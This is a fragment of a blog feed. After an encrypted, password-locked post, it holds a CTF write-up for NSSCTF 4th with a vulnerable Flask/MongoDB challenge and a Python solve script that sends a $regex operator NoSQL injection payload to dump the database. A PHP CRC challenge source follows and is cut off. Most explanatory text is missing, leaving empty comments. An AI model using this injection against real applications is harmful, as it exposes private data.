7c394b43dd45a2f37726718da192c3ff7838d1c22502317fcb9c4167f6c1bb8ff379ae492ba830fb00a688feac1fcd52bb9700ec96a09db63e6dc6c159902cb25e35e9cf597fb067e6b8ff6b5931e1b539da653557ed78f0d62cfac55ceec91a38daaf45671f70931bd72878cbb715206e47fa20d4a4a9124d005d2c164f76a7501e9d61f95a95d24c82b634a774b90f067a4d68749080cc1d707c7c9bab66d8b3b7b6b49197eba9fc91398056cf34541f10dcbfd58f2679379cb27ba5edd59829587e32b3732861b893667205fe1d4a7f5d4d1ec09e0c56b80c2a130980698c5f547ede02c8b0f878f57367423455eeb62c7b1bc4e8d2893725ecebf6fc8f8967f6985395693ace19ebaf66247289bddce095acea08e34f832e4cafcba66865db28bf75f8e2a517bd47d543f673e960c8e5370c60e12b621d5e2987cc8b2d8ae2f854efd5b12bcc9acc385b3e2f557d25f4f10089be0ee6e5d529571ea9960febe1e4e4e1ac2b4611e1b1afa3ac8b3593917912fbcbaaf2397928682b8ee2ba739de24f47cd50064eaca24d323e12158e55332ea9880174cff2210d79c442504852a68fb6fdaf73a74c4528ff9ff6d455af0db3cb5ed7521a953cf5a6a22623656c24897cfe1ed59142771588fdf3b68f5704cb45d903bf643e5641031215d42cc5e01c35120eb88cf78aaf93e2f0a7193e8bd063782df848844aceeabb61f9076c52d7c6cb08fc1f3005d96214850c627a449b9f49f45c870993501847f40b21f7c8c3573cab80b899c77e01f2305918a3b3cbf66ab67c683a8d04b4c520af08e3936bcc2cd2c44ea8d18368f58d8dd59c72f7a12ac72363f6969ce3630c0f3d159e6ad77105a746dc36c4ed59137357659dcf07a8a88bd03b65120840c38fd63c91bc07e6db77fbe3f0d7fa82e66b734e9017b3500f94c71a72859b078a7700eca25ead0e1132ce4022227eff583232ce664e4b130d6e73fea53b2165855499cddc8a6af138dd5a81e81087e3bede671120aba8bed36376da758fee7c536cc3d6045f482dd59ba8f4d20aaa76248bb8ad1d45276ea27968aaa64a9de59bf0b6fbe90707fc9e6c66e9bfba6475b99b37c3f058843a2c459a37139e19eb4c5c6feb45217f1f62e764bfd6e9cfb32c1d1cbee1fd727d01bede7720f51a3245bfe78d8ff7ff1d0e23b825486133c46567abef44b4f971731c6b61fe25a5ca589ec2b82c02591be6e4e63ad6f71bd8fdb0473fe02b939f1ad2f4e72c5ccfb727592f78a1f98f88fa2b6f9f9650d21a56341ac797298b3b467ca02be793bfc7cf86594a2537366e0baab28686a833368aebcd4ffc0b2618051f2a1a041bb60ea54598db35b22b7627d87104a26ea0121805b104d1863ac5001c0736c97f56b2b9ced5a4fef75a380e0c42da338b7c4c42d5cc8d41cc70c657469749223982c5009f5ac802c7588408c78a2b843538022fce5eed093f550e918df07b05d77215d6ae4a1d5d8ea0c5f9e36a998b93dd058689911c656070a767a908fc28e321b8322e7835d3aa5cc85c5a94e33e754609e6cdfc74169e01c1a6fb0bb7e13287583bbbe2533f549ac558d85f58346f25da264cf8d25725627e36ba7c0851ad80e2b4f8678aed67d0bc77c2538d42fef1b279d5e739f4a7d27eae15039c8f61fcc3e15c1b08254eafcdc6120a733b22e35a7bb35b41c4be007a47f5207d11d617b6e9a6dce49fd86138e23df19a497670dba69e5833d3dc2ac60b5d79851ace08fb10804d973486f43c804703cb421ed24a7920a900fb48c19b5cb9c95ff2f0f28cf269ad41ea7bd2489b06c43a00c8a8d62e73527b46636ab6a1f49a6f124a3dd06506d5bc3b6e56bb45f46e89a4aa7a5481ac91da6b16e09b377ce31f08aadf2a5cf7c68e8bd5f81ef27fe20cd7b60257d2cd1f002cd1081a9b7a43a426ea7a9340cda1775bd0355e5b3741d96c11cd2879cafb37a6d7c651cc87ea6235aa3aa4ec07de50d28eba69185f41fef8ff552d16952e3d95eff536f89e4f2cf61f608412c5b000993d9f121bb7bec52b607c4eb045dd21e9db4d35b5e67e29c2ad328bb6994b524f2a687767b547f044a289c673740cb260fd61d39d82d0d6a38147d21bdc2fc3610c8830377ecc0068ec2b106e8214b0a199078a6a979ea690a2dd3a5e6bc0dd4945d9c4b228779d6e9a7bd8647b558c28d586dc7e1ca567d0c5afb71e042596850b4c3611e93cd1e4877e9b8b5609de4d16f993fb0992d2719263f3f151c81dfa24c81bd27cdd741d53e8713a55b2cab88f5b9b66b5da1046592dcd6eb70de205dfeca9d75310452389521d38f2989eafbe54929605ad5554018855a91c064d627c7a9263fc7eb3903edff4858795d0f2395194ec2d362d301cf0f864844045f0e4f0f75df9b8232ca191e2e07caffe5330aac2284fb035d5061aac8ee13863dcb3fe14e9783e81455c71340132b6d902287c0d8b6dddc17ded8af830daa749d8006a27a2dc4f692c0b6944fe2cc516e8ff2dc5831111385d1b89894cb481e285f198a3bf5cff31ee585ee9a5c2253918ee22be126681720c07ff05bcfe4da7897f817a5b83e4c4e40055773480ba2a733c0d9e0ac08a08b1d96432df245305cabf18f1a4acfc0b8413ccb04a519f58c9444f716e1444f46defa61f2b568a97b5b6f363e0ecd15a2baee5d4dcbb9cbc45145d0da25d90026a3335ef41a48bb3c4272f5d71306e3df4dd4dadd5541b990d3b93c31c72ef8c7211f660f1a4a26616adf222af7103268505877d4733cdc9489fd0bf270f615d268e5761faa7ee4071ca21d9f61af2e0b1b1148589862fcf8f37bd289b88d40c3a2f849943e127fcedde565718fc8d550894d131cb3bbe1edf1f94a288f6b9375d4cdc3f6719d8a9bb51a4ece276b045e769b6c84fb3affd06d800a810c9313572ac6daa704d0157ba9295c5676b4ac74449f6194cb398a690947df33c7aa0202ac29035fa85ae18f2c5c450211d0d1710da56ee7fba6f17411583c938938f1c573516ca8df04adf61716101dc19937d514cfcb1895002217a255a87dcfcce3bcab70a87fcf9720537c3772d63b85d223c505679bd8f247bbce605fd505c822fe6d49519774df9b577f6caa69ba5a25774e17abf7e62b616fd9ce56baba59f5539df57ea353540843a10b3b50444a184d877a85b6e04383cd66ec35604ab5ba38fbf6e1173c664ae6505fba175b9eace5d431751229a42fffc0ffd1f68bca0967c1cd4b27a537132c37d91582556dd025bca1d20600698a9966549111024281d5c6fea5a6f9ffd20e5ce90d31efc01ddf6f4d787fab6a1f960f89d0a3b96a63fa89ffdd8c56a5ea5eee81757a4ef1707779ad9c6d2f6f5e9532a5846228d18f09a07f096e2b4f59a59d30345f69f89daf0645695ee6f5c41d704cb394078a55555d53bab553c998eb319dcaf943034c4bca7c955a3b8608916fe3685ff534030411c9114d09ca51f26f6fa062b397f97e5586e8718a3616f1993c6ae8d1c1509ecdf8d4abb21f22500574fc75d278006e3157ba4bfd2df891c076271eb3b1a5d639431682f272f08ebf321836b8ec61fb48f73167dfd74650ab853ab3dd180c743c1c247bec58047650a3f26563c511631d10ae2f5715424e45ab6c4cc4a27e587fcb16846529d5be1364aa86e32ccc6556e43c6eca8657cfad9f8260fd67a97977da472d11c57be27b29d86966de8dcffc7746765aced183c32a67febfc6bfec95aed4f61a90236d2eec70124bd57c77319fb056f1488b177769bf2d62677791b35007096b28a51d97b6a5dae467f8f3d26a3b252abf3a11713b99e03e9d5ade2bf01fdfb912d3e7c9d6ecd41f79163db76a2c3805b9bd888819e5fffdb43955b73442bbe289d81f460b5b13e73637ea20a83bc2a741e06dd294ace851e5443399a2d835bdbcad4d18a2cec9ba8fed9323b0ea0ececfb37b25b7d8ddbeda6efa8cfdac3da374d6c201f2dbdc3b04a4a794955021cfa4f22d51e3d2d67f3e95c1294211c565fdc03c06e3260960246c4cba93de1f3d053254d884bae524d694ac910673f380135c6a89b4b81296b4ce6427492a95759bf77ff92eb3c3c5495210bf645dc04687228e25131cc2fe0c96278a903466a189c33ab7a389af62b65b87fae0262a0d183179e5e97208bb51b78e4f9720881fcaf8a3c5191407d72aac7b12d042f40b74beb528916b6a342e14076d7467df2607a97ad1a368368124f2bae67aff8abb08fd013c19accb2e0d77f68c1b474af49effd32d271380392a308272394eb97e6cf405f618fe59b9ff0716019df33eba8b201db887d6dcbc887761e6f5765ef28ac10b284f3dfead785bb6de04f2b68ed6d8be6a8b5d5107ae79e4bd16ea2cd2998757c0f6a14c14d0143e2377822595903352d835b57e0d2b84c4db0ee2b0d0ccaa07eed2ecbbe31b561d676ba015f6da37dd458483151715cbde9aa1d00145afeba164f559288acb7ad07ea37d62ed7ff0d9d39531b1c146f0f8eeab7d1ff30a8dffb16b7f7d6a0d89fc7bbad7e54285e1e815635d873a9918ec233d9cda1477207f73d18376c3d045adb81eb565ef08bf0e75b1497880307d8fd954a524ad1bee0622654161510bc5b2cc81d5d49d369c9b43f26f1f6e1fe93647467a84a7291c362d68ddfcf4cb471fb2587911d504b488a45bc13720e67cc9532983d250e8e11db5ffd426742b629ea488a751933eddb2f53c822537da7db80b0f517f0fbdb7398dd97d850da3353e61b1c4e97b12515c674370ed88e082e8934538435e70b3ffbf10db53f8634f534e65471802a2170408955c230563f62ce1f95177bf878cf8a25c0f49dad1e907f9dd044d867acde7794a417c827a3ea2c5c9d26e0c94f76a55b51179b40da061da824f4d53c1abca5f7d3f5f8a0000c5afabddc6dc38537de7a9cf6b9b14dfab0247f9a632978909e34e306355ff9d519b2843577c4be5f5edadb70215e02f7774213d016876c658c01198180b26f32e5cdbf893713fdee133b2342a7de7cafc2d7803267631bcb5e0305cbe2e15fb8eb9783a245112f6339297dd7cb8b2f2e7c9e4c0c31e7e2ae1233ff77973c9c58b2b441d37709cebcecfb0ff7429f90706c20fea5ae6c477b8e4ab803d417214839cc7708379e0fc8f2090ecbc1ff47a7bf4737358dd6a6f055aace9a3186b0893fae80b3d4949063bc15769532f0f59d1e0b623be2c126b77cc5927db026171b28a333198bb159bcd746b6f1f8045ac8057c526e8dea3f15aed78b06588c442b401c025b9440941629dbf8816f86b6a1e18f6bc82e1a639cc2b036a65431d27e5f5d17daa4178ca6cbd432183b22d15fb41ea52f0e30ce04cb27cca43e11f6bbe7c911dd537eebe8d06fdd1d227ce91db2e69edc64c2886b9ab66af7228c2afd71f1b04466cd93a0129b6d47e542d09b6d65a5a1ca48e21ed959f61b87f81d964ff00da870a4b115869b171626854635f0e6bc88e4dbe7fa11dc413289cff47f20e379484006dfeae87e30e226a43aa6cfb60e7b5f35c039434119dab10b2d52864146dccdbe635e67824d605b9c9c227d85a0d3808ccc3d1e9d150302dca471a8275b3ced370f92e023f3fea25d07eabcc3a90dd90def1166a23a68ffd31d3cc00cba932382e9f5ef816aad2e5499d99a1cb0347cde6abc975dab52aef4ac3b0698d96652dd2013f617af352db9adfff9cc75c9670a60fd6483adf154a9c38ffbf588ff277270b2457d4ed1266bc80d790f537049c359d8d3e2cdadd3a2aa8b53166cc1f529e60d4682442b19bd44fc730d972d00c3f1aeae5b7e3890987a091f5884a00b954b4911319b8aa327808f3044760ee49f6fbeae4ffb8426b07e7efd9490751368d6c0611c8c18a409bcc3c6e39a9b8c38a44c9978c8e8e3d4db3be95510ce4e11f9a7c8de94709c03ced0cf97b45baa56b214b9dbdc64b0cd0c142bbbf395269eef9c91195dee79538cd16c2a5a0c0398d2202e7c524dc2f1fc3f553ff0d04bfd62ba2c8a2a65577587c293dae8a475d249f5d6e16586e830292016139c086d1dcd5bb85c9a6ec5a36318b537c31526131f3b354f621e0fa76df8e16d38f294cc71023600aafcdd8d8bbd2522ea41c6a70fa6fd7fa4175384737e485d1369b2cea96258db1e5f13db20a095b7dcb1f97639b4c644bd71d23c5c76aaa04c671ef49d36850bc9acdf750b6cd916c7a1cb978e1d1dbf61eec465db56a66f6f6df0c511b0103eee3fe2ce1287b2a23a66ea3cdf35598d828e8d0d6de4b0d62bc772fc41eb22a9610fe23c7895ca434085b23afd0b1891a6ce9c2cf9da73cb30d51b236ed0ecb771383ede62f2e4090e496b919452061458c0ec4473b1b20e7ae190e27e74db7f1d5f2d807065ac8dac1114d08ecaf0160720e86827f08fe44d49fbe6ce5615e04d5dd3a4a267e9dab340dc1e3e45f6d1d8f8bf9df571e6aba946c9dfc5c778c457242027ba69859f2a3ac7507a9f37c4492758c7ca17f2f7bace13c97e846cdeba6e0026ab2bc4393a45540e8b42dfaa2c29f5868c7cbf239ee62a9d02c6f8e967941cde31a1160dbfbf0ab855e41b00f8fd9f2c212d3463535a525b2df16148841e96f011c55388094f3a8c5860e8d86f36eccf8ec840737752c6bdda78a97bc0cf3677b247d2b2f27554e0f7ffc65e93c81c6ce0fd377d7ac90db2a69118809a2f9234cfa330eea9821e0db115b5a1c0fe4d1ba10638cba40c5f2a49c5c795ee0e2083dec255060efdfea5ea3ef81ade010e31baddafd42e9a8ac313017b3badbe64bd98119c1320d577f227765a0f01e41c6884589b466ddc89fb00335c40b1e1b0bf7c73231354d77d96544b6a5e25ffe3772b169b8e51fd0230d07d4b0a0e866b15677fd238e45d2a8245e33ea55ff40e62ea84478d8402e74608de613d2b18eefb7dcf31fcaedbb5fe6b9724e71a33e6c4b2d1f8001c2c79934b82ca057cf4a01f516e797501bef4eba6df26de9bf3dca14601346180467c1b8037ff270a21e4a45b6b0dae0c0618830116a432174f6314d895a13b405aa609b3787dd21087ed31d39c1dc324abad99f9524a37b8b0f443197e44e3473ff06cfece508e8a187899e260ba5039c9b56390bd1f33410843624140c9d395f3a09ba75973f9288b2b3db825b46864e9aea394e049dc1cc13c9a018acd7b53076a0b67dcc122f1d1088b5da614008bb96f037b8fa64c09e020fdccb581187153bff39d776ced6f0fdcd3c259e2cbf42dfdf978475ca8924a40a4176fa4258b9da23e04f1f568c1f08adef232e08fe5bbdd76498c13a7c3c019bd3496fd4d0bbd29f97318a90898f6e150b79</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">The competition has not yet ended, and the content of write-up will not be made public for the time being.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>NSSCTF 4th-WriteUp</title>
    <link href="https://hvang10.github.io/2025/08/24/NSSCTF-4th-WriteUp/"/>
    <id>https://hvang10.github.io/2025/08/24/NSSCTF-4th-WriteUp/</id>
    <published>2025-08-24T10:25:48.000Z</published>
    <updated>2025-08-24T19:12:28.428Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://pic1.zhimg.com/80/v2-831f9285e57fba50f2eb1a6dc8c2b4eb_1440w.png" alt="" /><br /><strong>AI</strong></p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="ez_signin"><a class="markdownIt-Anchor" href="#ez_signin"></a> ez_signin</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify</span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">client = MongoClient(<span class="string">&quot;mongodb://localhost:27017/&quot;</span>)</span><br><span class="line">db = client[<span class="string">&#x27;aggie_bookstore&#x27;</span>]</span><br><span class="line">books_collection = db[<span class="string">&#x27;books&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize</span>(<span class="params">input_str: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&#x27;[^a-zA-Z0-9\s]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, input_str)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/search&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">    query = &#123;<span class="string">&quot;$and&quot;</span>: []&#125;</span><br><span class="line">    books = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        title = request.args.get(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">        author = request.args.get(<span class="string">&#x27;author&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">        title_clean = sanitize(title)</span><br><span class="line">        author_clean = sanitize(author)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> title_clean:</span><br><span class="line">            query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: &#123;<span class="string">&quot;$eq&quot;</span>: title_clean&#125;&#125;)  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> author_clean:</span><br><span class="line">            query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: &#123;<span class="string">&quot;$eq&quot;</span>: author_clean&#125;&#125;) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> query[<span class="string">&quot;$and&quot;</span>]:</span><br><span class="line">            books = <span class="built_in">list</span>(books_collection.find(query))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.content_type == <span class="string">&#x27;application/json&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = request.get_json(force=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                title = data.get(<span class="string">&quot;title&quot;</span>)</span><br><span class="line">                author = data.get(<span class="string">&quot;author&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(title, <span class="built_in">str</span>):</span><br><span class="line">                    title = sanitize(title)</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: title&#125;)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(title, <span class="built_in">dict</span>):</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: title&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(author, <span class="built_in">str</span>):</span><br><span class="line">                    author = sanitize(author)</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: author&#125;)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(author, <span class="built_in">dict</span>):</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: author&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> query[<span class="string">&quot;$and&quot;</span>]:</span><br><span class="line">                    books = <span class="built_in">list</span>(books_collection.find(query))</span><br><span class="line">                    <span class="keyword">return</span> jsonify([</span><br><span class="line">                        &#123;<span class="string">&quot;title&quot;</span>: b.get(<span class="string">&quot;title&quot;</span>), <span class="string">&quot;author&quot;</span>: b.get(<span class="string">&quot;author&quot;</span>), <span class="string">&quot;description&quot;</span>: b.get(<span class="string">&quot;description&quot;</span>)&#125; <span class="keyword">for</span> b <span class="keyword">in</span> books</span><br><span class="line">                    ])</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Empty query&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Unsupported Content-Type&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p><strong>NoSQL  (MongoDB )</strong><code>post</code><strong></strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment">#  URL</span></span><br><span class="line">URL = <span class="string">&quot;http://node9.anna.nssctf.cn:29421/search&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---  (Payload) ---</span></span><br><span class="line"><span class="comment">#  MongoDB  $regex  dump </span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;$regex&quot;</span>: <span class="string">&quot;.*&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;$regex&quot;</span>: <span class="string">&quot;.*&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---  ---</span></span><br><span class="line"><span class="comment">#  Content-Type  application/json</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">     flag </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] : <span class="subst">&#123;URL&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*]  Payload: <span class="subst">&#123;json.dumps(payload)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#  POST </span></span><br><span class="line">        response = requests.post(URL, headers=headers, json=payload, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n[+]  200 OK&quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment">#  JSON </span></span><br><span class="line">                books = response.json()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> books:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*] &quot;</span>)</span><br><span class="line">                <span class="comment"># </span></span><br><span class="line">                <span class="keyword">for</span> i, book <span class="keyword">in</span> <span class="built_in">enumerate</span>(books, <span class="number">1</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n---  <span class="subst">&#123;i&#125;</span>  ---&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;   (Title): <span class="subst">&#123;book.get(<span class="string">&#x27;title&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;   (Author): <span class="subst">&#123;book.get(<span class="string">&#x27;author&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;   (Description): <span class="subst">&#123;book.get(<span class="string">&#x27;description&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n[*] Flag &quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!]  JSON &quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    : <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] : <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    : <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] : <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] : <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure><h2 id="ezcrc"><a class="markdownIt-Anchor" href="#ezcrc"></a> EzCRC</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compute_crc16</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$checksum</span> = <span class="number">0xFFFF</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$checksum</span> ^= <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">8</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$checksum</span> &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="variable">$checksum</span> = ((<span class="variable">$checksum</span> &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xA001</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$checksum</span> &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$checksum</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calculate_crc8</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$crc8_table</span> = [</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x0E</span>, <span class="number">0x09</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x12</span>, <span class="number">0x15</span>,</span><br><span class="line">        <span class="number">0x38</span>, <span class="number">0x3F</span>, <span class="number">0x36</span>, <span class="number">0x31</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>,</span><br><span class="line">        <span class="number">0x70</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x79</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x65</span>,</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x4F</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>,</span><br><span class="line">        <span class="number">0xE0</span>, <span class="number">0xE7</span>, <span class="number">0xEE</span>, <span class="number">0xE9</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xF2</span>, <span class="number">0xF5</span>,</span><br><span class="line">        <span class="number">0xD8</span>, <span class="number">0xDF</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>, <span class="number">0xC4</span>, <span class="number">0xC3</span>, <span class="number">0xCA</span>, <span class="number">0xCD</span>,</span><br><span class="line">        <span class="number">0x90</span>, <span class="number">0x97</span>, <span class="number">0x9E</span>, <span class="number">0x99</span>, <span class="number">0x8C</span>, <span class="number">0x8B</span>, <span class="number">0x82</span>, <span class="number">0x85</span>,</span><br><span class="line">        <span class="number">0xA8</span>, <span class="number">0xAF</span>, <span class="number">0xA6</span>, <span class="number">0xA1</span>, <span 